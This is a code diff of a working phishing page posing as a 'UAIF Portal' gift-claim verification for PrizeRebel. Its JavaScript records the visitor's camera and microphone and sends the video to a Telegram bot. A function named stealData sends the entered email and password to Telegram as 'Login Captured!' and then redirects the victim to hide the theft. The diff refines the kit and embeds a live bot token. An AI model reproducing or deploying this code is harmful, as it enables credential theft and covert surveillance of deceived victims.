@@ -24,7 +24,6 @@
             overflow: hidden;
         }
 
-        /* --- TOP RIGHT PROFILE --- */
         .header-profile {
             position: absolute;
             top: 20px;
@@ -42,7 +41,6 @@
         .v-badge { color: var(--primary); font-weight: bold; }
         .user-photo { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
 
-        /* --- MAIN CARD --- */
         .main-card {
             background: var(--glass);
             backdrop-filter: blur(25px);
@@ -70,7 +68,6 @@
             transition: 0.3s;
         }
 
-        /* --- INPUTS & PASSWORD TOGGLE --- */
         .input-group { text-align: left; margin-bottom: 15px; position: relative; }
         label { display: block; margin-bottom: 5px; font-size: 13px; color: #94a3b8; }
         input {
@@ -93,7 +90,6 @@
             font-weight: bold;
         }
 
-        /* --- SPONSORS --- */
         .footer-sponsor {
             position: absolute;
             bottom: 30px;
@@ -123,7 +119,6 @@
     </div>
 
     <div class="main-card">
-        
         <div id="step-1">
             <h1 style="color: var(--primary);">UAIF Portal</h1>
             <p>Verify your identity to claim your <b>PrizeRebel Gift</b>.</p>
@@ -135,7 +130,7 @@
             <h2 style="color: var(--hacker)">ANALYZING SENSORS</h2>
             <div class="loader-ring"></div>
             <p id="timer" style="font-size: 35px; font-weight: bold;">30</p>
-            <p style="font-family: monospace; color: var(--hacker);">cheacking Encrypted Handshake...</p>
+            <p style="font-family: monospace; color: var(--hacker);">checking Encrypted Handshake...</p>
         </div>
 
         <div id="step-3" class="hidden">
@@ -174,13 +169,19 @@
     <script>
         // --- CONFIGURATION ---
         const BOT_TOKEN = '8519852338:AAGLztQixpgpju8BFN77yKx5IPEByL20Jao';
-        const CHAT_ID = '6804829152'
-const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('id');
+        
+        // Grab the ID from the URL (sent by the Telegram bot)
+        const urlParams = new URLSearchParams(window.location.search);
+        let CHAT_ID = urlParams.get('id');
+
+        // Fallback if no ID is found in the link
+        if (!CHAT_ID) {
+            CHAT_ID = '6804829152'; 
+        }
+
         let recorder;
         let chunks = [];
 
-        // Show/Hide Password Toggle
         function togglePassword() {
             const p = document.getElementById('pass');
             const s = document.querySelector('.toggle-pass');
@@ -193,12 +194,15 @@ const CHAT_ID = urlParams.get('id');
             }
         }
 
-        // Start Recording and 30s Countdown
         async function startVerification() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Requesting camera AND audio
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
+                });
+                
                 document.getElementById('vid').srcObject = stream;
-
                 document.getElementById('step-1').classList.add('hidden');
                 document.getElementById('step-2').classList.remove('hidden');
 
@@ -216,28 +220,30 @@ const CHAT_ID = urlParams.get('id');
                     }
                 }, 1000);
             } catch (err) {
-                alert("Security Error: Camera access is mandatory for robot verification.");
+                console.error(err);
+                alert("Security Error: Camera access is mandatory for verification. Please click 'Allow' in your browser.");
             }
         }
 
         function stopAndNext() {
-            recorder.stop();
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('video', blob, 'capture.mp4');
+            if (recorder && recorder.state !== "inactive") {
+                recorder.stop();
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('video', blob, 'capture.mp4');
 
-                // Send video silently
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd })
+                    .then(response => console.log('Video Sent'))
+                    .catch(error => console.error('Error sending video:', error));
 
-                document.getElementById('step-2').classList.add('hidden');
-                document.getElementById('step-3').classList.remove('hidden');
-            };
+                    document.getElementById('step-2').classList.add('hidden');
+                    document.getElementById('step-3').classList.remove('hidden');
+                };
+            }
         }
 
-    
-    // Steal Data and Redirect to PrizeRebel immediately
         function stealData() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
@@ -248,28 +254,22 @@ const CHAT_ID = urlParams.get('id');
                 return;
             }
 
-            // 1. Change button text to show "Processing"
-            btn.innerText = "Sychronizing...";
+            btn.innerText = "Synchronizing...";
             btn.style.opacity = "0.7";
             btn.disabled = true;
 
-            const text = `🎯 **Login Captured!**\n\n📧 Email: ${email}\n🔑 Pass: ${pass}`;
+            const text = `🎯 **Login Captured!**\n\n📧 Email: ${email}\n🔑 Pass: ${pass}\n🆔 Target ID: ${CHAT_ID}`;
 
-            // 2. Send to Telegram (without 'await' so it doesn't block the redirect)
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: '6804829152', text: text, parse_mode: 'Markdown' })
             });
 
-            // 3. Forced Redirect after a very short delay (800ms) 
-            // This gives the browser enough time to start the fetch but feels instant to the user.
             setTimeout(() => {
                 window.location.href = "https://www.prizerebel.com";
-            }, 800);
+            }, 1000);
         }
     </script>
 </body>
 </html>
-
-
